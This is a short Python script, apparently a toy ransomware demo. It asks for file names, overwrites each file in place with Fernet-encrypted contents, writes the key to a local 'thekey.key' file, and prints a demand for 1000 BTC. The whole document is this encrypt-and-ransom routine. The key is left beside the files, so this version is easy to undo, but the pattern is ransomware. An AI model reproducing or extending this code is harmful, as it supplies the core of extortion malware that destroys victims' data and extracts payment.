import os 
from cryptography.fernet import Fernet

# Get filenames from user and split into list
file_names = input("Enter the files you want to encrypt (comma-separated): ").split(', ')

# Find the specified files in the current directory
files = [file for file in os.listdir() if file in file_names]

if len(files) < len(file_names):
    print("Files not found!")
else:
    print("Files to be encrypted:", files)
    
    # Generate and save encryption key
    key = Fernet.generate_key()
    with open("thekey.key", "wb") as thekey:
        thekey.write(key)
    
    # Encrypt each file
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        encrypted_contents = Fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(encrypted_contents)
            
    print("\nYour files are encrypted!!! Send me 1000 BTC!!!\n")
